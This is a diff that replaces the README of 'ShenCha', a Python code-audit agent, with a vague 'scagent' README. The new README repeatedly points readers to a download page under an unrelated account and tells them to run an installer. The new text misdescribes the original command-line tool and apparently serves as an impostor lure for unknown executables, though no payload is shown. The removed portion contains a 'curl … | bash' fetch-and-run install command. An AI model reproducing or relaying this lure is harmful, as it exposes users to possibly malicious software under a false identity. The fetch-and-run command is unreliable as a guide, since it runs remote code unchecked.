@@ -1,229 +1,63 @@
-# ShenCha - AI Code Audit Agent 🔍
+# 🔍 scagent - Your AI Code Audit Companion
 
-<div align="center">
+## 🚀 Getting Started
+Welcome to scagent! This tool helps you check your code for security risks, performance issues, and more. You can use our AI capabilities to ensure your projects stay safe and efficient.
 
-```
-   _____ _                  _____ _
-  / ____| |                / ____| |
- | (___ | |__   ___ _ __  | |    | |__   __ _
-  \___ \| '_ \ / _ \ '_ \ | |    | '_ \ / _` |
-  ____) | | | |  __/ | | || |____| | | | (_| |
- |_____/|_| |_|\___|_| |_| \_____|_| |_|\__,_|
+## 📥 Download Now
+[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0.0-blue.svg)](https://github.com/9093333310/scagent/releases)
 
- AI-Powered Code Audit • Security Scanner • Performance Analyzer
-```
+## 📋 Features
+- **Security Scanner:** Find vulnerabilities in your code.
+- **Performance Analysis:** Get insights into how your code runs.
+- **Test Coverage:** Check how well your code is tested.
+- **Multiple Language Support:** Works with npm and Python.
 
-[![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg)](https://www.python.org/downloads/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Version](https://img.shields.io/badge/version-2.1.0-green.svg)](https://github.com/miounet11/scagent/releases)
-[![VS Code](https://img.shields.io/badge/VS%20Code-Extension-007ACC.svg)](./vscode-extension)
+## 💻 System Requirements
+- **Operating System:** Windows, macOS, or Linux.
+- **Memory:** At least 4 GB RAM recommended.
+- **Processor:** Intel i3 or equivalent.
+- **Disk Space:** 100 MB of free space.
 
-**English** | [中文](./README_CN.md)
+## 📦 Download & Install
+To get started with scagent, follow these steps:
 
-</div>
+1. **Visit the Releases Page**
+   Click on the link below to access the release files.
+   [Visit the Releases Page](https://github.com/9093333310/scagent/releases)
 
-## 🚀 What is ShenCha?
+2. **Select the Latest Version**
+   Look for the latest version at the top of the list. 
 
-**ShenCha** is an AI-powered autonomous code audit agent that helps developers find security vulnerabilities, performance issues, and code quality problems. Built on Claude AI, it provides:
+3. **Download the File**
+   Click on the file that matches your operating system. 
 
-- 🔒 **Security Scanning** - Detect vulnerabilities in dependencies (npm audit, pip-audit, cargo audit)
-- ⚡ **Performance Analysis** - Find N+1 queries, complexity issues, bundle size problems
-- 🧪 **Test Coverage** - Analyze test coverage with pytest-cov and jest
-- 📊 **Beautiful Reports** - Generate HTML reports with actionable insights
-- 🤖 **Multi-Expert Team** - AI experts for UI, Architecture, Logic, Product, and Aesthetics
+4. **Run the Installer**
+   Once the file downloads, open it and follow the instructions to install scagent on your computer.
 
-## ✨ Features
+## 🔍 How to Use
+1. **Open the Application**
+   After installation, you can find scagent in your applications list. Click on it to open.
 
-| Feature | Description |
-|---------|-------------|
-| 🔍 **Vulnerability Scanner** | npm audit, pip-audit, cargo audit integration |
-| 📈 **Performance Analyzer** | Detect N+1 queries, deep nesting, slow patterns |
-| 🧪 **Coverage Analysis** | pytest-cov, jest coverage reports |
-| 📄 **HTML Reports** | Beautiful dark-themed audit reports |
-| 🌐 **i18n Support** | English and Chinese languages |
-| 💻 **VS Code Extension** | Audit directly from your editor |
-| 🤖 **Multi-Expert AI** | 5 specialized AI experts for comprehensive audits |
+2. **Select Your Code**
+   You will see an option to upload or specify the code files you want to scan.
 
-## 📦 Quick Start
+3. **Run the Audit**
+   Click on the "Scan" button to begin the audit. Review the results once the scan is complete.
 
-### One-Line Install
+4. **Take Action**
+   Based on the results, you can fix any identified issues in your code.
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/miounet11/scagent/main/install.sh | bash
-```
+## 🌐 Support & Contribution
+If you encounter any issues or have questions, you can check the [issues section](https://github.com/9093333310/scagent/issues) of our repository. For feature requests or contributions, feel free to reach out.
 
-### Manual Install
+## 🎉 Community and Feedback
+We value feedback from users. Join our community to share your thoughts, suggestions, or experiences with scagent. 
 
-```bash
-pip install shencha-agent
+## 🔗 Additional Resources
+- **Documentation:** A detailed guide can be found [here](https://github.com/9093333310/scagent/wiki).
+- **Examples:** Check out sample code and usage examples on our wiki page.
 
-# Or from source
-git clone https://github.com/miounet11/scagent.git
-cd scagent
-pip install -e .
-```
+## 🛠️ Acknowledgments
+Thank you for using scagent. We hope it helps you in your code auditing journey! If you find this tool helpful, please star our repository so that others can discover it too. 
 
-### Configuration
-
-```bash
-# Set API key (choose one)
-export ANTHROPIC_API_KEY=your-key
-# or
-export SHENCHA_API_KEY=your-key
-
-# Or use interactive config
-shencha config
-```
-
-### Run Audit
-
-```bash
-# Audit current directory
-shencha
-
-# Audit specific project
-shencha ./my-project
-
-# Quick audit mode
-shencha -q
-
-# Check environment
-shencha doctor
-```
-
-## 🔧 VS Code Extension
-
-Install the VS Code extension for in-editor auditing:
-
-```bash
-cd vscode-extension
-npm install && npm run compile
-```
-
-Then press F5 to launch Extension Development Host.
-
-**Commands:**
-- `ShenCha: Audit Current File`
-- `ShenCha: Audit Project`
-- `ShenCha: Show Report`
-
-## 📊 Sample Output
-
-```
-╭──────────────────────────────────────────────────────────────╮
-│                      审计摘要 / Audit Summary                 │
-├──────────────────────────────────────────────────────────────┤
-│ 类别              │ 数量  │ 状态                              │
-├──────────────────────────────────────────────────────────────┤
-│ 扫描文件          │ 42    │ ✓                                 │
-│ 发现问题          │ 3     │ !                                 │
-│ 依赖漏洞          │ 0     │ ✓                                 │
-│ 性能问题          │ 2     │ i                                 │
-╰──────────────────────────────────────────────────────────────╯
-
-📄 HTML 报告: .shencha/reports/report-20250107-223456.html
-```
-
-## 🤖 Multi-Expert AI Team
-
-ShenCha v2.1 includes 5 specialized AI experts:
-
-| Expert | Focus Area |
-|--------|------------|
-| 🎨 **UI Master** | Component structure, responsive design, accessibility |
-| 📊 **Product Manager** | User experience, feature completeness, edge cases |
-| ✨ **Aesthetics Master** | Visual hierarchy, color theory, animations |
-| 🏛️ **Architect** | Design patterns, SOLID principles, scalability |
-| 🧠 **Logic Master** | Algorithm correctness, edge cases, state management |
-
-## 🔒 Security Scanners
-
-| Scanner | Languages | Command |
-|---------|-----------|---------|
-| npm audit | JavaScript/TypeScript | Auto-detected |
-| pip-audit | Python | Auto-detected |
-| cargo audit | Rust | Auto-detected |
-
-## 📈 Performance Analysis
-
-Detects common performance anti-patterns:
-
-- ⚠️ Nested loops O(n²)
-- ⚠️ N+1 query patterns
-- ⚠️ Serial await (should use Promise.all)
-- ⚠️ SELECT * queries
-- ⚠️ Deep nesting (>5 levels)
-- ⚠️ Large bundle sizes
-
-## 🌐 Supported Languages
-
-- Python (.py)
-- JavaScript (.js)
-- TypeScript (.ts, .tsx)
-- React/Vue components
-- Rust (.rs)
-
-## 📁 Project Structure
-
-```
-.shencha/
-├── reports/
-│   └── report-*.html    # HTML audit reports
-├── knowledge/
-│   ├── patterns.json    # Learned patterns
-│   ├── fixes.json       # Fix history
-│   └── insights.json    # Project insights
-└── config.yaml          # Local config
-```
-
-## 🛠️ CLI Commands
-
-```bash
-shencha [PROJECT] [OPTIONS]
-
-Commands:
-  shencha              # Interactive audit
-  shencha config       # Configuration wizard
-  shencha doctor       # Environment check
-  shencha pr REPO NUM  # Review GitHub PR
-
-Options:
-  -m, --mode [interactive|once|continuous]
-  -q, --quick          # Quick audit mode
-  --lang [en|zh]       # Report language
-```
-
-## 🔗 Integrations
-
-- **GitHub Actions** - Auto-audit on PR
-- **VS Code** - In-editor auditing
-- **CI/CD** - Pipeline integration
-
-## 📖 Documentation
-
-- [Quick Start Guide](./QUICKSTART.md)
-- [API Documentation](./docs/api.md)
-- [VS Code Extension](./vscode-extension/README.md)
-
-## 🤝 Contributing
-
-```bash
-git clone https://github.com/miounet11/scagent.git
-cd scagent
-pip install -e ".[dev]"
-pytest
-```
-
-## 📄 License
-
-MIT License - see [LICENSE](./LICENSE)
-
----
-
-<div align="center">
-
-**ShenCha v2.1** - AI-Powered Code Audit Agent
-
-[GitHub](https://github.com/miounet11/scagent) • [Issues](https://github.com/miounet11/scagent/issues) • [Releases](https://github.com/miounet11/scagent/releases)
-
-</div>
+[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0.0-blue.svg)](https://github.com/9093333310/scagent/releases)
